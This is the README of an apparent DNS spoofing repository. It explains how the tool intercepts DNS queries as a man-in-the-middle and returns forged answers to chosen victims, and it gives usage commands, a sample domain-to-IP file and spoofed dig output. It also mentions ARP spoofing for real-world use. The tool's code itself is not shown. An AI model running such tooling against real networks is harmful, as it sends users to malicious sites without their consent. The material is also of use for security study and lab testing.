# DNS-Spoofing

**DNS** stands for **D**omain **N**ame **S**ystem and the main purpose of DNS is to translate Domain Names to IP addresses. **DNS spoofing** refers to an attack that modifies the DNS records returned to the querier. This can be achieved with different techniques such as DNS Hijacking or DNS cache poisoning. The purpose of the attack is to redirect users to malicious websites instead of legitimate website.

This repository consists of DNS spoofing application which does some type of DNS Hijacking with Man-In-The-Middle attack which intercepts the DNS queries in the network and sends out the spoofed DNS responses with user-defined IP addresses. The same application is implemented in two programmig languages, *C* and *Python*, and they work independantly. Choose one implementation that suits your requirement.

**Note:** 
- To utilize this application in real-world, the application should have access to sniff the packets in the network. Otherwise [ARP spoofing](https://en.wikipedia.org/wiki/ARP_spoofing) is required before utilizing this application. 

- Additional DNS Hijacking techniques to explore includes **Local DNS Hijack** using malware/Trojan on user's computer, **Router DNS Hijack** in which the attacker gets hold of Router and modifies the DNS settings. 

## Python

**Version** `Python3`

**Requirements**
```shell
pip3 install -r requirements.txt
```
**Usage**
```
$ sudo python3 dns_spoofer.py --help

usage: dns_spoofer.py [-h] -f FILE -i INTERFACE [-l LOCAL_IP] [-t TARGET_VICTIMS]

This is a DNS Spoofing application

optional arguments:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  Input file in YAML format with website names and corresponding IP address to be returned in DNS response
  -i INTERFACE, --interface INTERFACE
                        Ethernet Interface on which to sniff DNS packets
  -l LOCAL_IP, --local_ip LOCAL_IP
                        Provide local IP to prevent self-spoofing. If not provided ip route cmd will be executed to grep local_ip
  -t TARGET_VICTIMS, --target_victims TARGET_VICTIMS
                        List of "," separated IP addresses to target for DNS spoofing
```

**Input File**
```yaml
www.foo.com: 1.1.1.1
www.bar.com: 2.2.2.2
```

**Execution**
```shell
sudo python3 dns_spoofer.py -i <interface-name> -f spoof_input.yaml
```

**Workflow Output**

1. DNS Request from X.X.X.X to Y.Y.Y.Y using *dig* command
```shell
dig @Y.Y.Y.Y www.foo.com
```

2. Application sniffs DNS query and sends out Spoofed DNS response to querier X.X.X.X 
```shell
Spoofing: www.foo.com.
Spoofed DNS Response Sent: X.X.X.X
```

3. DNS response received by X.X.X.X
```
; <<>> DiG 9.10.6 <<>> @Y.Y.Y.Y www.foo.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 44034
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;www.foo.com.			IN	A

;; ANSWER SECTION:
www.foo.com.		255	IN	A	1.1.1.1

;; Query time: 120 msec
;; SERVER: Y.Y.Y.Y#53(Y.Y.Y.Y)
;; WHEN: Sun Aug 02 16:22:38 PDT 2020
;; MSG SIZE  rcvd: 56
```
